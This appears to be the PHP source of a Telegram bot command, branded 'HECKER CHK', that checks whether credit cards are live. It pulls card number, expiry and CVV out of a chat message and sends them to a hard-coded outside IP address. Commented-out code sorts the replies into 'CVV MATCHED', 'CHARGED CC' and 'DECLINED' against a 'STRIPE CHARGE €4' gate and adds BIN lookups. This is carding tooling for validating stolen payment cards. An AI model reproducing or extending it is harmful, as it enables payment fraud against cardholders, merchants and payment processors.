<?php
error_reporting(0);
ini_set('display_errors', 0);
include __DIR__."/../config/config.php";
include __DIR__."/../config/variables.php";
include_once __DIR__."/../functions/bot.php";
include_once __DIR__."/../functions/db.php";
include_once __DIR__."/../functions/functions.php";

if ((strpos($message, "/spp") === 0)||(strpos($message, "!spp") === 0)||(strpos($message, ".spp") === 0)){
    // $antispam = antispamCheck($userId);
    // addUser($userId);
    // if($antispam != False){
    //     $delay = microtimeFormat($starttime);
    //     $result = urlencode("[<u>ANTI SPAM</u>] Try again after <b>$antispam</b>s.");
    //     $su = reply_to($chat_id,$message_id,$keyboard,$result);
    //     $respon = json_decode($su, TRUE);
    //     $message_id_1 = $respon['result']['message_id'];
    // }else{
        $starttime = microtime(true);
        sendaction($chat_id, "typing");
        $lista = substr($message, 5);
        if(preg_match_all("/(\d{16})[\/\s:|]*?(\d\d)[\/\s|]*?(\d{2,4})[\/\s|-]*?(\d{3})/", $lista, $matches)) {
            
            // $bin = substr($cc, 0, 6);
            $creditcard = $matches[0][0];
            $cc = multiexplode(array(":", "|", "/", " "), $creditcard)[0];
            $mes = multiexplode(array(":", "|", "/", " "), $creditcard)[1];
            $ano = multiexplode(array(":", "|", "/", " "), $creditcard)[2];
            $cvv = multiexplode(array(":", "|", "/", " "), $creditcard)[3];

            // $message = substr($message, 4);
            // $cc = multiexplode(array(":", "/", " ", "|"), $message)[0];
            // $mes = multiexplode(array(":", "/", " ", "|"), $message)[1];
            // $ano = multiexplode(array(":", "/", " ", "|"), $message)[2];
            // $cvv = multiexplode(array(":", "/", " ", "|"), $message)[3];
        
            // $lista = "$cc|$mes|$ano|$cvv";

            $delay = microtimeFormat($starttime);
            $result = urlencode("<b>HECKER CHK ⚡️ - Status - PUBLIC RELEASE
    ━━━━━━━━━━━━━
    [ϟ] CC: ".$lista."
    [T] Tiempo: $delay s
    [ϟ] STATUS: BEING CHECKED,PLEASE WAIT.
    ━━━━━━━━━━━━━</b>");
            $su = reply_to($chat_id,$message_id,$keyboard,$result);
            $respon = json_decode($su, TRUE);
            $mes_id = $respon['result']['message_id'];

            echo $lista;
            // $sendmes = "https://api.telegram.org/bot$botToken/sendMessage?chat_id=".$chatId."&text=<b>HECKER CHK ⚡️ - Status - $sat%0A━━━━━━━━━━━━━%0A[ϟ] CC: ".$lista."%0A[ϟ] STATUS: BEING CHECKED,PELASE WAIT.%0A━━━━━━━━━━━━━</b>&reply_to_message_id=".$message_id."&parse_mode=HTML";
        
            // $sent = json_decode(file_get_contents($sendmes) ,1);
            // $mes_id = $sent['result']['message_id'];
        }
        try{
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, 'http://20.212.107.64/sendnudez/Hcaptcha/chk.php?lista='.$lista.'');
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            $fimaa = curl_exec($ch);
            
            $msg = trim(strip_tags(getStr($fimaa,' <br>Result:','</span><br>')));
            echo $msg;
        }
        catch (Exception $e){
            echo $e;
        }
//         if (strpos($fimaa, "INSUFFICIENT FUNDS") || strpos($fimaa, "CVV LIVE")) {
//             $pass = 'CVV MATCHED ✅';
//         }
//         if (strpos($fimaa, "TRANSACTION NOT ALLOWED") || strpos($fimaa, "3DS2")) {
//             $pass = 'CVV MATCHED ✅';
//         }
//         if (strpos($fimaa, "Security code is incorrect") || strpos($fimaa, "CCN CC")) {
//             $pass = 'CVC MISMATCH ✅';
//         }
        
//         if (strpos($fimaa, "€4 Charged ✅") || strpos($fimaa, "CHARGED CC")) {
//             $pass = 'CVC CHECK PASS ✅';
//         }
//         if (strpos($fimaa, "Error updating default payment method. Your card was declined.") || strpos($fimaa, "Your card was declined.")) {
//             $pass = 'DECLINED ❌';
//         }

//         try{
//             $bin = substr("$cc", 0, 6);

//             $ch = curl_init();
//             curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$bin.'');
//             curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
//             curl_setopt($ch, CURLOPT_HTTPHEADER, array(
//             'Host: lookup.binlist.net',
//             'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
//             'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'));
//             curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
//             curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
//             curl_setopt($ch, CURLOPT_POSTFIELDS, 'bin='.$bin.'');
//             $fim = curl_exec($ch);
//             $bank = GetStr($fim, '"bank":{"name":"', '"');
//             $name = strtoupper(GetStr($fim, '"name":"', '"'));
//             $brand = strtoupper(GetStr($fim, '"brand":"', '"'));
//             $country = strtoupper(GetStr($fim, '"country":{"name":"', '"'));
//             $scheme = strtoupper(GetStr($fim, '"scheme":"', '"'));
//             $emoji = GetStr($fim, '"emoji":"', '"');
//             $type =strtoupper(GetStr($fim, '"type":"', '"'));
//             if(strpos($fim, '"type":"Credit"') !== false){};
//             $bug = file_get_contents('bugdb.txt');
//             $bugs = explode("\n", $bug);
//             if (in_array($bin, $bugs)) {
//                 $isbug = $t;
//             }
//             else {
//                 $isbug = $f;
//             }
//         }catch(Exception $a){
//             echo $a;
//         }
//         $binrs = "<b>
// ━━━━━━━━━━━━━
// [ϟ] BIN: $bin
// [ϟ] COUNTRY: $country $emoji
// [ϟ] BRAND: $brand
// [ϟ] LEVEL: $scheme
// [ϟ] TYPE: $type
// [ϟ] BANK: $bank</b>";

        // $time_end = microtime(true);
        // $execution_time = ($time_end - $time_start);
        // $delay2 = microtimeFormat($starttime);
        // $result2 = urlencode("<b>HECKER CHK ⚡️ - Status - $sat%0A━━━━━━━━━━━━━%0A[ϟ] GATE: STRIPE CHARGE €4%0A[ϟ] CC: <code>$lista</code>%0A[ϟ] STATUS: $pass%0A[ϟ] RESPONSE: $msg%0A[ϟ] BUG BIN: $isbug%0A$binrs%0A━━━━━━━━━━━━━%0A[ϟ] TIME TAKEN: $execution_time's%0A[ϟ] Checked By: @$username%0A[ϟ] UserID: $userId%0A[ϟ] Premium Activated: $stat%0A</b>");
        // $su1 = reply_to2($chat_id,$mes_id,$keyboard,$result2);

//         $delay2 = microtimeFormat($starttime);
//         $result2 = urlencode("<b>HECKER CHK ⚡️ - Status - PUBLIC RELEASE
// ━━━━━━━━━━━━━
// [ϟ] GATE: STRIPE CHARGE €4
// [ϟ] CC: <code>$lista</code>
// [ϟ] STATUS: $pass
// [ϟ] RESPONSE: $msg
// [ϟ] BUG BIN: $isbug
// $binrs
// ━━━━━━━━━━━━━
// [ϟ] TIME TAKEN: $delay2's
// [ϟ] Checked By: @$username
// [ϟ] UserID: $userId
// [ϟ] Premium Activated: ACTIVATED</b>");

//         $su1 = reply_to2($chat_id,$mes_id,$keyboard,$result2);
        // $su = reply_to2($chat_id,$message_id_1,$keyboard,"<b> CC ->> <code>$cc|$mes|$ano|$cvv</code> %0APROCESS ->> □□□□□ 0%[🟥] %0ATIME ->> {$mytime($starttime)}s %0ACHECKING BY ->> <a href='tg://user?id=$gId'>@$username</a> %0ABOT BY :- <code>@ANONBD</code></b>");
        // $respon2 = json_decode($su1, TRUE);
        // $message_id_2 = $respon2['result']['message_id'];

        // editMessage($chatId, "<b>HECKER CHK ⚡️ - Status - $sat%0A━━━━━━━━━━━━━%0A[ϟ] GATE: STRIPE CHARGE €4%0A[ϟ] CC: <code>$lista</code>%0A[ϟ] STATUS: $pass%0A[ϟ] RESPONSE: $msg%0A[ϟ] BUG BIN: $isbug%0A$binrs%0A━━━━━━━━━━━━━%0A[ϟ] TIME TAKEN: $execution_time's%0A[ϟ] Checked By: @$username%0A[ϟ] UserID: $userId%0A[ϟ] Premium Activated: $stat%0A</b>",$mes_id);
    // }
    // else {
    //     sendMessage($chatId, "<b>You are not authorized to use this command in here.You can use me in @heckerdrops chat or get authorization.</b>", $message_id);
    // }
}
?>